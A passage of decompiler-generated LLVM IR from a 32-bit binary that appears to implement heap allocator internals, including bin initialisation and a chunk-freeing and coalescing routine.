dec_label_pc_80530ea:                             ; preds = %dec_label_pc_80530dc
  %v0_80530ea = load i32, i32* @ebx, align 4
  %v1_80530ea = add i32 %v0_80530ea, 8
  %v2_80530ea = inttoptr i32 %v1_80530ea to i32*
  %v3_80530ea = load i32, i32* %v2_80530ea, align 4
  store i32 %v3_80530ea, i32* @edx, align 4
  %v1_80530ed = add i32 %v0_80530ea, 12
  %v2_80530ed = inttoptr i32 %v1_80530ed to i32*
  %v3_80530ed = load i32, i32* %v2_80530ed, align 4
  store i32 %v3_80530ed, i32* %eax.global-to-local, align 4
  %v1_80530f0 = add i32 %v3_80530ea, 12
  %v2_80530f0 = inttoptr i32 %v1_80530f0 to i32*
  %v3_80530f0 = load i32, i32* %v2_80530f0, align 4
  store i32 %v3_80530f0, i32* @esi, align 4
  %v12_80530f3 = icmp eq i32 %v3_80530f0, %v0_80530ea
  %v1_80530f5 = icmp eq i1 %v12_80530f3, false
  br i1 %v1_80530f5, label %dec_label_pc_80530fc, label %dec_label_pc_80530f7

dec_label_pc_80530f7:                             ; preds = %dec_label_pc_80530ea
  %v1_80530f7 = add i32 %v3_80530ed, 8
  %v2_80530f7 = inttoptr i32 %v1_80530f7 to i32*
  %v3_80530f7 = load i32, i32* %v2_80530f7, align 4
  %v15_80530f7 = icmp eq i32 %v3_80530f7, %v3_80530f0
  br i1 %v15_80530f7, label %dec_label_pc_8053101, label %dec_label_pc_80530fc

dec_label_pc_80530fc:                             ; preds = %dec_label_pc_80530f7, %dec_label_pc_80530ea, %dec_label_pc_80530bf, %dec_label_pc_80530ac
  %v0_80530fc = call i32 @function_8053375()
  store i32 %v0_80530fc, i32* %eax.global-to-local, align 4
  %v1_8053103.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8053101

dec_label_pc_8053101:                             ; preds = %dec_label_pc_80530f7, %dec_label_pc_80530fc
  %v1_8053103 = phi i32 [ %v3_80530ea, %dec_label_pc_80530f7 ], [ %v1_8053103.pre, %dec_label_pc_80530fc ]
  %v0_8053103 = phi i32 [ %v3_80530ed, %dec_label_pc_80530f7 ], [ %v0_80530fc, %dec_label_pc_80530fc ]
  %v0_8053101 = load i32, i32* @edi, align 4
  %v1_8053101 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8053101 = add i32 %v1_8053101, %v0_8053101
  store i32 %v2_8053101, i32* @edi, align 4
  %v2_8053103 = add i32 %v1_8053103, 12
  %v3_8053103 = inttoptr i32 %v2_8053103 to i32*
  store i32 %v0_8053103, i32* %v3_8053103, align 4
  %v0_8053106 = load i32, i32* @edx, align 4
  %v1_8053106 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053106 = add i32 %v1_8053106, 8
  %v3_8053106 = inttoptr i32 %v2_8053106 to i32*
  store i32 %v0_8053106, i32* %v3_8053106, align 4
  br label %dec_label_pc_8053109

dec_label_pc_8053109:                             ; preds = %dec_label_pc_80530dc, %dec_label_pc_8053101
  store i32 %v1_8053054, i32* %eax.global-to-local, align 4
  %v3_805310d = load i32, i32* %v2_805310d, align 4
  store i32 %v3_805310d, i32* @edx, align 4
  %v0_8053110 = load i32, i32* @ecx, align 4
  store i32 %v0_8053110, i32* %v2_805310d, align 4
  %v0_8053113 = load i32, i32* @edi, align 4
  %v1_8053115 = or i32 %v0_8053113, 1
  store i32 %v1_8053115, i32* %eax.global-to-local, align 4
  %v0_8053118 = load i32, i32* @ecx, align 4
  %v1_8053118 = load i32, i32* @edx, align 4
  %v2_8053118 = add i32 %v1_8053118, 12
  %v3_8053118 = inttoptr i32 %v2_8053118 to i32*
  store i32 %v0_8053118, i32* %v3_8053118, align 4
  %v0_805311b = load i32, i32* %eax.global-to-local, align 4
  %v1_805311b = load i32, i32* @ecx, align 4
  %v2_805311b = add i32 %v1_805311b, 4
  %v3_805311b = inttoptr i32 %v2_805311b to i32*
  store i32 %v0_805311b, i32* %v3_805311b, align 4
  store i32 %v1_8053054, i32* %eax.global-to-local, align 4
  %v0_8053122 = load i32, i32* @edx, align 4
  %v1_8053122 = load i32, i32* @ecx, align 4
  %v2_8053122 = add i32 %v1_8053122, 8
  %v3_8053122 = inttoptr i32 %v2_8053122 to i32*
  store i32 %v0_8053122, i32* %v3_8053122, align 4
  %v0_8053125 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053125 = load i32, i32* @ecx, align 4
  %v2_8053125 = add i32 %v1_8053125, 12
  %v3_8053125 = inttoptr i32 %v2_8053125 to i32*
  store i32 %v0_8053125, i32* %v3_8053125, align 4
  %v0_8053128 = load i32, i32* @edi, align 4
  %v1_8053128 = load i32, i32* @ecx, align 4
  %v3_8053128 = add i32 %v1_8053128, %v0_8053128
  %v4_8053128 = inttoptr i32 %v3_8053128 to i32*
  store i32 %v0_8053128, i32* %v4_8053128, align 4
  br label %dec_label_pc_805313d

dec_label_pc_805312d:                             ; preds = %dec_label_pc_80530cc
  %v0_805312d = load i32, i32* @edi, align 4
  %v2_805312d = add i32 %v0_805312d, %v1_80530d4
  %v1_8053130 = or i32 %v2_805312d, 1
  store i32 %v1_8053130, i32* %eax.global-to-local, align 4
  %v1_8053133 = load i32, i32* @ecx, align 4
  %v2_8053133 = add i32 %v1_8053133, 4
  %v3_8053133 = inttoptr i32 %v2_8053133 to i32*
  store i32 %v1_8053130, i32* %v3_8053133, align 4
  store i32 %tmp20, i32* @edx, align 4
  %v0_805313a = load i32, i32* @ecx, align 4
  store i32 %v0_805313a, i32* %v3_805313a, align 4
  br label %dec_label_pc_805313d

dec_label_pc_805313d:                             ; preds = %dec_label_pc_8053109, %dec_label_pc_805312d
  store i32 %v3_805308f, i32* @ecx, align 4
  %v1_8053141 = icmp eq i32 %v3_805308f, 0
  %v1_8053143 = icmp eq i1 %v1_8053141, false
  br i1 %v1_8053143, label %dec_label_pc_805308f, label %dec_label_pc_8053149

dec_label_pc_8053149:                             ; preds = %dec_label_pc_805313d, %dec_label_pc_805307b
  %v15_805314d = icmp eq i32 %v0_8053089, %v4_8053073
  br i1 %v15_805314d, label %dec_label_pc_80531d1, label %dec_label_pc_8053153

dec_label_pc_8053153:                             ; preds = %dec_label_pc_8053149
  %v4_8053153 = add i32 %v0_8053089, 4
  br label %dec_label_pc_805307b

dec_label_pc_805315d:                             ; preds = %dec_label_pc_805315d.lr.ph, %dec_label_pc_805315d
  %v1_8053161 = phi i32 [ 1, %dec_label_pc_805315d.lr.ph ], [ %v0_805316c, %dec_label_pc_805315d ]
  %v2_8053161 = mul i32 %v1_8053161, 8
  %v4_8053161 = add i32 %v3_8053161, %v2_8053161
  store i32 %v4_8053161, i32* %eax.global-to-local, align 4
  %v1_8053165 = add i32 %v1_8053161, 1
  store i32 %v1_8053165, i32* %edx.global-to-local, align 4
  %v2_8053166 = add i32 %v4_8053161, 12
  %v3_8053166 = inttoptr i32 %v2_8053166 to i32*
  store i32 %v4_8053161, i32* %v3_8053166, align 4
  %v0_8053169 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053169 = add i32 %v0_8053169, 8
  %v3_8053169 = inttoptr i32 %v2_8053169 to i32*
  store i32 %v0_8053169, i32* %v3_8053169, align 4
  %v0_805316c = load i32, i32* %edx.global-to-local, align 4
  %v7_805316f = icmp sgt i32 %v0_805316c, 95
  br i1 %v7_805316f, label %dec_label_pc_8053171, label %dec_label_pc_805315d

dec_label_pc_8053171:                             ; preds = %dec_label_pc_805315d
  store i32 %tmp20, i32* %eax.global-to-local, align 4
  %v1_8053175 = add i32 %tmp20, 864
  %v2_8053175 = inttoptr i32 %v1_8053175 to i32*
  %v3_8053175 = load i32, i32* %v2_8053175, align 4
  %v4_8053175 = or i32 %v3_8053175, 1
  store i32 %v4_8053175, i32* %v2_8053175, align 4
  %v0_805317c = load i32, i32* %eax.global-to-local, align 4
  %v1_805317c = add i32 %v0_805317c, 840
  %v2_805317c = inttoptr i32 %v1_805317c to i32*
  store i32 0, i32* %v2_805317c, align 4
  %v0_8053186 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053186 = add i32 %v0_8053186, 852
  %v2_8053186 = inttoptr i32 %v1_8053186 to i32*
  store i32 65536, i32* %v2_8053186, align 4
  %v0_8053190 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053190 = add i32 %v0_8053190, 844
  %v2_8053190 = inttoptr i32 %v1_8053190 to i32*
  store i32 262144, i32* %v2_8053190, align 4
  %v0_805319a = load i32, i32* %eax.global-to-local, align 4
  %v1_805319a = add i32 %v0_805319a, 836
  %v2_805319a = inttoptr i32 %v1_805319a to i32*
  store i32 262144, i32* %v2_805319a, align 4
  store i32 %tmp20, i32* @edx, align 4
  %v2_80531ab = load i32, i32* %arg1, align 4
  %v1_80531ad = urem i32 %v2_80531ab, 4
  %v1_80531b0 = or i32 %v1_80531ad, 72
  store i32 %v1_80531b0, i32* %arg1, align 4
  %v0_80531b5 = load i32, i32* @edx, align 4
  %v1_80531b7 = add i32 %v0_80531b5, 52
  store i32 %v1_80531b7, i32* %eax.global-to-local, align 4
  %v2_80531ba = add i32 %v0_80531b5, 44
  %v3_80531ba = inttoptr i32 %v2_80531ba to i32*
  store i32 %v1_80531b7, i32* %v3_80531ba, align 4
  %v1_80531bf = call i32 @function_80537b9(i32 30)
  store i32 %v1_80531bf, i32* %eax.global-to-local, align 4
  %v2_80531cb = add i32 %tmp20, 860
  %v3_80531cb = inttoptr i32 %v2_80531cb to i32*
  store i32 %v1_80531bf, i32* %v3_80531cb, align 4
  br label %dec_label_pc_80531d1

dec_label_pc_80531d1:                             ; preds = %dec_label_pc_8053149, %dec_label_pc_8053171
  store i32 %v0_8053034, i32* @ebx, align 4
  store i32 %v0_8053033, i32* @esi, align 4
  store i32 %v0_8053032, i32* @edi, align 4
  %v0_80531d8 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_80531d8

; uselistorder directives
  uselistorder i32 %v0_805316c, { 1, 0 }
  uselistorder i32 %v0_8053169, { 1, 0 }
  uselistorder i32 %v1_8053161, { 1, 0 }
  uselistorder i32 %v0_8053128, { 1, 0 }
  uselistorder i32 %v1_80530e3, { 1, 0 }
  uselistorder i32 %v2_80530dc, { 1, 0 }
  uselistorder i32 %v1_80530d4, { 0, 2, 1, 3 }
  uselistorder i32 %v1_80530e0, { 1, 0 }
  uselistorder i32 %v3_805308f, { 2, 1, 3, 0 }
  uselistorder i32 %v0_80530ac, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_8053089, { 1, 0, 3, 2 }
  uselistorder i32* %v3_805313a, { 1, 0 }
  uselistorder i32 %v1_8053054, { 1, 0 }
  uselistorder i32 %tmp20, { 3, 13, 11, 10, 8, 7, 1, 9, 2, 6, 5, 0, 12, 4 }
  uselistorder i32* %ebp.global-to-local, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 24, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 17, 18, 15, 16, 19, 20, 21, 22, 23, 25, 26, 27, 28 }
  uselistorder i32 860, { 1, 0 }
  uselistorder i32 -3, { 1, 0 }
  uselistorder label %dec_label_pc_80531d1, { 1, 0 }
  uselistorder label %dec_label_pc_805315d, { 1, 0 }
  uselistorder label %dec_label_pc_805313d, { 1, 0 }
  uselistorder label %dec_label_pc_8053109, { 1, 0 }
  uselistorder label %dec_label_pc_8053101, { 1, 0 }
  uselistorder label %dec_label_pc_80530cc, { 1, 0 }
}

define i32 @function_80531d9(i32 %arg1) local_unnamed_addr {
dec_label_pc_80531d9:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_80531d9 = load i32, i32* @ebp, align 4
  %v0_80531da = load i32, i32* @edi, align 4
  %v0_80531db = load i32, i32* @esi, align 4
  %v0_80531dc = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_80531e4 = icmp eq i32 %arg1, 0
  br i1 %v1_80531e4, label %dec_label_pc_805336d, label %dec_label_pc_80531ec

dec_label_pc_80531ec:                             ; preds = %dec_label_pc_80531d9
  %v2_80531f7 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80531f7, i32* @eax, align 4
  %v2_80531fc = call i32 @function_8053940(i32 %v2_80531f7, i32 134560061)
  store i32 %v2_80531fc, i32* %eax.global-to-local, align 4
  %v1_8053208 = call i32 @function_805393d(i32 ptrtoint (i32* @global_var_8056080.200 to i32))
  %v1_805320d = add i32 %arg1, -8
  store i32 %v1_805320d, i32* @ecx, align 4
  %v0_8053210 = load i8, i8* @global_var_8056840.201, align 1
  %v1_8053210 = sext i8 %v0_8053210 to i32
  store i32 %v1_8053210, i32* %eax.global-to-local, align 4
  %v1_8053218 = add i32 %arg1, -4
  %v2_8053218 = inttoptr i32 %v1_8053218 to i32*
  %v3_8053218 = load i32, i32* %v2_8053218, align 4
  %v1_805321d = and i32 %v3_8053218, -4
  %v4_805321d = trunc i32 %v1_805321d to i8
  store i32 %v1_805321d, i32* @ebx, align 4
  %v8_8053222 = icmp ugt i8 %v4_805321d, %v0_8053210
  br i1 %v8_8053222, label %dec_label_pc_8053244, label %dec_label_pc_8053224

dec_label_pc_8053224:                             ; preds = %dec_label_pc_80531ec
  %v2_8053224 = udiv i32 %v3_8053218, 8
  %v1_8053227 = or i32 %v1_8053210, 3
  %v3_8053227 = trunc i32 %v1_8053227 to i8
  store i32 %v1_8053227, i32* %eax.global-to-local, align 4
  store i8 %v3_8053227, i8* @global_var_8056840.201, align 64
  %v1_805322f = mul nuw i32 %v2_8053224, 4
  %v2_805322f = add i32 %v1_805322f, ptrtoint (i8* @global_var_8056840.201 to i32)
  store i32 %v2_805322f, i32* @edx, align 4
  %v1_8053236 = add i32 %v1_805322f, add (i32 ptrtoint (i8* @global_var_8056840.201 to i32), i32 -4)
  %v2_8053236 = inttoptr i32 %v1_8053236 to i32*
  %v3_8053236 = load i32, i32* %v2_8053236, align 4
  store i32 %v3_8053236, i32* %eax.global-to-local, align 4
  %v3_8053239 = inttoptr i32 %arg1 to i32*
  store i32 %v3_8053236, i32* %v3_8053239, align 4
  %v0_805323c = load i32, i32* @ecx, align 4
  %v1_805323c = load i32, i32* @edx, align 4
  %v2_805323c = add i32 %v1_805323c, -4
  %v3_805323c = inttoptr i32 %v2_805323c to i32*
  store i32 %v0_805323c, i32* %v3_805323c, align 4
  br label %dec_label_pc_805335c

dec_label_pc_8053244:                             ; preds = %dec_label_pc_80531ec
  %v1_8053244 = trunc i32 %v3_8053218 to i8
  %v2_8053244 = and i8 %v1_8053244, 2
  %v3_8053244 = icmp eq i8 %v2_8053244, 0
  %v5_8053244 = zext i8 %v2_8053244 to i32
  %v7_8053244 = and i32 %v3_8053218, -256
  %v8_8053244 = or i32 %v5_8053244, %v7_8053244
  store i32 %v8_8053244, i32* @edx, align 4
  %v1_8053247 = icmp eq i1 %v3_8053244, false
  br i1 %v1_8053247, label %dec_label_pc_805333c, label %dec_label_pc_805324d

dec_label_pc_805324d:                             ; preds = %dec_label_pc_8053244
  %v1_805324d = or i32 %v1_8053210, 1
  %v3_805324d = trunc i32 %v1_805324d to i8
  store i32 %v1_805324d, i32* %eax.global-to-local, align 4
  %v2_8053250 = add i32 %v1_805321d, %v1_805320d
  store i32 %v2_8053250, i32* @esi, align 4
  store i8 %v3_805324d, i8* @global_var_8056840.201, align 64
  %v1_8053258 = add i32 %v2_8053250, 4
  %v2_8053258 = inttoptr i32 %v1_8053258 to i32*
  %v3_8053258 = load i32, i32* %v2_8053258, align 4
  store i32 %v3_8053258, i32* %eax.global-to-local, align 4
  %v2_805325f = inttoptr i32 %v1_8053218 to i8*
  %v3_805325f = load i8, i8* %v2_805325f, align 1
  %v4_805325f = urem i8 %v3_805325f, 2
  %v5_805325f = icmp eq i8 %v4_805325f, 0
  %v1_8053263 = icmp eq i1 %v5_805325f, false
  br i1 %v1_8053263, label %dec_label_pc_8053286, label %dec_label_pc_8053265

dec_label_pc_8053265:                             ; preds = %dec_label_pc_805324d
  %v2_8053265 = inttoptr i32 %v1_805320d to i32*
  %v3_8053265 = load i32, i32* %v2_8053265, align 4
  store i32 %v3_8053265, i32* @ebp, align 4
  %v2_805326a = sub i32 %v1_805320d, %v3_8053265
  store i32 %v2_805326a, i32* %eax.global-to-local, align 4
  %v1_805326c = add i32 %v2_805326a, 8
  %v2_805326c = inttoptr i32 %v1_805326c to i32*
  %v3_805326c = load i32, i32* %v2_805326c, align 4
  store i32 %v3_805326c, i32* @edi, align 4
  %v1_805326f = add i32 %v2_805326a, 12
  %v2_805326f = inttoptr i32 %v1_805326f to i32*
  %v3_805326f = load i32, i32* %v2_805326f, align 4
  store i32 %v3_805326f, i32* @edx, align 4
  %v1_8053272 = add i32 %v3_805326c, 12
  %v2_8053272 = inttoptr i32 %v1_8053272 to i32*
  %v3_8053272 = load i32, i32* %v2_8053272, align 4
  store i32 %v3_8053272, i32* @ecx, align 4
  %v12_8053275 = icmp eq i32 %v3_8053272, %v2_805326a
  %v1_8053277 = icmp eq i1 %v12_8053275, false
  br i1 %v1_8053277, label %dec_label_pc_80532b5, label %dec_label_pc_8053279

dec_label_pc_8053279:                             ; preds = %dec_label_pc_8053265
  %v1_8053279 = add i32 %v3_805326f, 8
  %v2_8053279 = inttoptr i32 %v1_8053279 to i32*
  %v3_8053279 = load i32, i32* %v2_8053279, align 4
  %v15_8053279 = icmp eq i32 %v3_8053279, %v3_8053272
  %v1_805327c = icmp eq i1 %v15_8053279, false
  br i1 %v1_805327c, label %dec_label_pc_80532b5, label %dec_label_pc_805327e

dec_label_pc_805327e:                             ; preds = %dec_label_pc_8053279
  %v2_805327e = add i32 %v3_8053265, %v1_805321d
  store i32 %v2_805327e, i32* @ebx, align 4
  store i32 %v3_805326f, i32* %v2_8053272, align 4
  %v0_8053283 = load i32, i32* @edi, align 4
  %v1_8053283 = load i32, i32* @edx, align 4
  %v2_8053283 = add i32 %v1_8053283, 8
  %v3_8053283 = inttoptr i32 %v2_8053283 to i32*
  store i32 %v0_8053283, i32* %v3_8053283, align 4
  %v0_805328d.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8053286

dec_label_pc_8053286:                             ; preds = %dec_label_pc_805324d, %dec_label_pc_805327e
  %v1_8053299 = phi i32 [ %v2_8053250, %dec_label_pc_805324d ], [ %v0_805328d.pre, %dec_label_pc_805327e ]
  %v1_805328a = and i32 %v3_8053258, -4
  store i32 %v1_805328a, i32* @ebp, align 4
  %v1_805328d = load i32, i32* @global_var_805686c.202, align 4
  %v12_805328d = icmp eq i32 %v1_8053299, %v1_805328d
  br i1 %v12_805328d, label %dec_label_pc_80532e7, label %dec_label_pc_8053295

dec_label_pc_8053295:                             ; preds = %dec_label_pc_8053286
  %v2_8053295 = add i32 %v1_8053299, 4
  %v3_8053295 = add i32 %v2_8053295, %v1_805328a
  %v4_8053295 = inttoptr i32 %v3_8053295 to i32*
  %v5_8053295 = load i32, i32* %v4_8053295, align 4
  store i32 %v5_8053295, i32* %eax.global-to-local, align 4
  %v3_8053299 = inttoptr i32 %v2_8053295 to i32*
  store i32 %v1_805328a, i32* %v3_8053299, align 4
  %v0_805329c = load i32, i32* %eax.global-to-local, align 4
  %v1_805329c = urem i32 %v0_805329c, 2
  %v2_805329c = icmp eq i32 %v1_805329c, 0
  store i32 %v1_805329c, i32* %eax.global-to-local, align 4
  %v1_80532a1 = icmp eq i1 %v2_805329c, false
  br i1 %v1_80532a1, label %dec_label_pc_80532c2, label %dec_label_pc_80532a3

dec_label_pc_80532a3:                             ; preds = %dec_label_pc_8053295
  %v0_80532a3 = load i32, i32* @esi, align 4
  %v1_80532a3 = add i32 %v0_80532a3, 8
  %v2_80532a3 = inttoptr i32 %v1_80532a3 to i32*
  %v3_80532a3 = load i32, i32* %v2_80532a3, align 4
  store i32 %v3_80532a3, i32* @edx, align 4
  %v1_80532a6 = add i32 %v0_80532a3, 12
  %v2_80532a6 = inttoptr i32 %v1_80532a6 to i32*
  %v3_80532a6 = load i32, i32* %v2_80532a6, align 4
  store i32 %v3_80532a6, i32* %eax.global-to-local, align 4
  %v1_80532a9 = add i32 %v3_80532a3, 12
  %v2_80532a9 = inttoptr i32 %v1_80532a9 to i32*
  %v3_80532a9 = load i32, i32* %v2_80532a9, align 4
  store i32 %v3_80532a9, i32* @edi, align 4
  %v12_80532ac = icmp eq i32 %v3_80532a9, %v0_80532a3
  %v1_80532ae = icmp eq i1 %v12_80532ac, false
  br i1 %v1_80532ae, label %dec_label_pc_80532b5, label %dec_label_pc_80532b0

dec_label_pc_80532b0:                             ; preds = %dec_label_pc_80532a3
  %v1_80532b0 = add i32 %v3_80532a6, 8
  %v2_80532b0 = inttoptr i32 %v1_80532b0 to i32*
  %v3_80532b0 = load i32, i32* %v2_80532b0, align 4
  %v15_80532b0 = icmp eq i32 %v3_80532b0, %v3_80532a9
  br i1 %v15_80532b0, label %dec_label_pc_80532ba, label %dec_label_pc_80532b5

dec_label_pc_80532b5:                             ; preds = %dec_label_pc_80532b0, %dec_label_pc_80532a3, %dec_label_pc_8053279, %dec_label_pc_8053265
  %v0_80532b5 = call i32 @function_8053375()
  store i32 %v0_80532b5, i32* %eax.global-to-local, align 4
  %v1_80532ba.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80532ba

dec_label_pc_80532ba:                             ; preds = %dec_label_pc_80532b0, %dec_label_pc_80532b5
  %v1_80532ba = phi i32 [ %v3_80532a3, %dec_label_pc_80532b0 ], [ %v1_80532ba.pre, %dec_label_pc_80532b5 ]
  %v0_80532ba = phi i32 [ %v3_80532a6, %dec_label_pc_80532b0 ], [ %v0_80532b5, %dec_label_pc_80532b5 ]
  %v2_80532ba = add i32 %v1_80532ba, 12
  %v3_80532ba = inttoptr i32 %v2_80532ba to i32*
  store i32 %v0_80532ba, i32* %v3_80532ba, align 4
  %v0_80532bd = load i32, i32* @edx, align 4
  %v1_80532bd = load i32, i32* %eax.global-to-local, align 4
  %v2_80532bd = add i32 %v1_80532bd, 8
  %v3_80532bd = inttoptr i32 %v2_80532bd to i32*
  store i32 %v0_80532bd, i32* %v3_80532bd, align 4
  %v0_80532c0 = load i32, i32* @ebx, align 4
  %v1_80532c0 = load i32, i32* @ebp, align 4
  %v2_80532c0 = add i32 %v1_80532c0, %v0_80532c0
  store i32 %v2_80532c0, i32* @ebx, align 4
  br label %dec_label_pc_80532c2

dec_label_pc_80532c2:                             ; preds = %dec_label_pc_8053295, %dec_label_pc_80532ba
  %v0_80532c2 = load i32, i32* @global_var_805687c.220, align 4
  store i32 %v0_80532c2, i32* %eax.global-to-local, align 4
  %v0_80532c7 = load i32, i32* @ecx, align 4
  %v1_80532c7 = add i32 %v0_80532c7, 12
  %v2_80532c7 = inttoptr i32 %v1_80532c7 to i32*
  store i32 ptrtoint (i32* @global_var_8056874.204 to i32), i32* %v2_80532c7, align 4
  %v0_80532ce = load i32, i32* %eax.global-to-local, align 4
  %v1_80532ce = load i32, i32* @ecx, align 4
  %v2_80532ce = add i32 %v1_80532ce, 8
  %v3_80532ce = inttoptr i32 %v2_80532ce to i32*
  store i32 %v0_80532ce, i32* %v3_80532ce, align 4
  %v0_80532d1 = load i32, i32* @ebx, align 4
  %v1_80532d1 = load i32, i32* @ecx, align 4
  %v3_80532d1 = add i32 %v1_80532d1, %v0_80532d1
  %v4_80532d1 = inttoptr i32 %v3_80532d1 to i32*
  store i32 %v0_80532d1, i32* %v4_80532d1, align 4
  %v0_80532d4 = load i32, i32* @ecx, align 4
  %v1_80532d4 = load i32, i32* %eax.global-to-local, align 4
  %v2_80532d4 = add i32 %v1_80532d4, 12
  %v3_80532d4 = inttoptr i32 %v2_80532d4 to i32*
  store i32 %v0_80532d4, i32* %v3_80532d4, align 4
  %v0_80532d7 = load i32, i32* @ebx, align 4
  %v1_80532d9 = or i32 %v0_80532d7, 1
  store i32 %v1_80532d9, i32* %eax.global-to-local, align 4
  %v0_80532dc = load i32, i32* @ecx, align 4
  store i32 %v0_80532dc, i32* @global_var_805687c.220, align 4
  %v2_80532e2 = add i32 %v0_80532dc, 4
  %v3_80532e2 = inttoptr i32 %v2_80532e2 to i32*
  store i32 %v1_80532d9, i32* %v3_80532e2, align 4
  br label %dec_label_pc_80532f7

dec_label_pc_80532e7:                             ; preds = %dec_label_pc_8053286
  %v0_80532e7 = load i32, i32* @ebx, align 4
  %v2_80532e7 = add i32 %v0_80532e7, %v1_805328a
  store i32 %v2_80532e7, i32* @ebx, align 4
  %v1_80532eb = or i32 %v2_80532e7, 1
  store i32 %v1_80532eb, i32* %eax.global-to-local, align 4
  %v1_80532ee = load i32, i32* @ecx, align 4
  %v2_80532ee = add i32 %v1_80532ee, 4
  %v3_80532ee = inttoptr i32 %v2_80532ee to i32*
  store i32 %v1_80532eb, i32* %v3_80532ee, align 4
  %v0_80532f1 = load i32, i32* @ecx, align 4
  store i32 %v0_80532f1, i32* @global_var_805686c.202, align 4
  br label %dec_label_pc_80532f7

dec_label_pc_80532f7:                             ; preds = %dec_label_pc_80532c2, %dec_label_pc_80532e7
  %v0_80532f7 = load i32, i32* @ebx, align 4
  %tmp21 = icmp ult i32 %v0_80532f7, 131072
  br i1 %tmp21, label %dec_label_pc_805335c, label %dec_label_pc_80532ff

dec_label_pc_80532ff:                             ; preds = %dec_label_pc_80532f7
  %v0_80532ff = load i8, i8* @global_var_8056840.201, align 64
  %v1_80532ff = and i8 %v0_80532ff, 2
  %v2_80532ff = icmp eq i8 %v1_80532ff, 0
  br i1 %v2_80532ff, label %dec_label_pc_8053318, label %dec_label_pc_8053308

dec_label_pc_8053308:                             ; preds = %dec_label_pc_80532ff
  %v2_8053310 = call i32 @function_8053031(i32* bitcast (i8* @global_var_8056840.201 to i32*))
  store i32 %v2_8053310, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053318

dec_label_pc_8053318:                             ; preds = %dec_label_pc_80532ff, %dec_label_pc_8053308
  %v0_8053318 = load i32, i32* @global_var_805686c.202, align 4
  store i32 %v0_8053318, i32* %eax.global-to-local, align 4
  %v1_805331d = add i32 %v0_8053318, 4
  %v2_805331d = inttoptr i32 %v1_805331d to i32*
  %v3_805331d = load i32, i32* %v2_805331d, align 4
  %v1_8053320 = and i32 %v3_805331d, -4
  store i32 %v1_8053320, i32* %eax.global-to-local, align 4
  %v1_8053323 = load i32, i32* @global_var_8056b84.218, align 4
  %v7_8053323 = icmp ult i32 %v1_8053320, %v1_8053323
  br i1 %v7_8053323, label %dec_label_pc_805335c, label %dec_label_pc_805332b

dec_label_pc_805332b:                             ; preds = %dec_label_pc_8053318
  store i32 ptrtoint (i8* @global_var_8056840.201 to i32), i32* @edx, align 4
  %v0_8053330 = load i32, i32* @global_var_8056b88.216, align 8
  store i32 %v0_8053330, i32* @eax, align 4
  %v0_8053335 = call i32 @function_8052fa4()
  store i32 %v0_8053335, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805335c

dec_label_pc_805333c:                             ; preds = %dec_label_pc_8053244
  %v2_805333c = inttoptr i32 %v1_805320d to i32*
  %v3_805333c = load i32, i32* %v2_805333c, align 4
  %v0_805333f = load i32, i32* @global_var_8056b90.209, align 16
  %v1_805333f = add i32 %v0_805333f, -1
  store i32 %v1_805333f, i32* @global_var_8056b90.209, align 16
  %v2_8053345 = add i32 %v3_805333c, %v1_805321d
  store i32 %v2_8053345, i32* %eax.global-to-local, align 4
  %v2_8053348 = sub i32 %v1_805320d, %v3_805333c
  %v0_805334e = load i32, i32* @global_var_8056ba4.212, align 4
  %v2_805334e = sub i32 %v0_805334e, %v2_8053345
  store i32 %v2_805334e, i32* @global_var_8056ba4.212, align 4
  %v4_8053354 = inttoptr i32 %v2_8053348 to i32*
  %v5_8053354 = call i32 @function_80540a5(i32* %v4_8053354, i32 %v2_8053345, i32 %v1_805321d, i32 %v1_805321d)
  store i32 %v5_8053354, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805335c

dec_label_pc_805335c:                             ; preds = %dec_label_pc_8053318, %dec_label_pc_80532f7, %dec_label_pc_805332b, %dec_label_pc_8053224, %dec_label_pc_805333c
  store i32 %v2_80531f7, i32* @eax, align 4
  %v2_8053365 = call i32 @function_8053940(i32 %v2_80531f7, i32 1)
  store i32 %v2_8053365, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805336d

dec_label_pc_805336d:                             ; preds = %dec_label_pc_80531d9, %dec_label_pc_805335c
  %.0 = phi i32 [ undef, %dec_label_pc_80531d9 ], [ %v2_8053365, %dec_label_pc_805335c ]
  store i32 %v0_80531dc, i32* @ebx, align 4
  store i32 %v0_80531db, i32* @esi, align 4
  store i32 %v0_80531da, i32* @edi, align 4
  store i32 %v0_80531d9, i32* @ebp, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v3_805333c, { 1, 0 }
  uselistorder i32 %v0_80532d1, { 1, 0 }
  uselistorder i32 %v1_805329c, { 1, 0 }
  uselistorder i32 %v2_8053295, { 1, 0 }
  uselistorder i32 %v1_805328a, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8053299, { 1, 0 }
  uselistorder i32 %v1_805321d, { 3, 4, 0, 1, 2, 5, 6 }
  uselistorder i32 %v3_8053218, { 1, 2, 0, 3 }
  uselistorder i32 %v1_805320d, { 1, 4, 2, 3, 0, 5 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 8, 9, 10, 11, 14, 15, 12, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* bitcast (i8* @global_var_8056840.201 to i32*), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_8056874.204 to i32), { 1, 2, 3, 4, 5, 6, 7, 0, 8 }
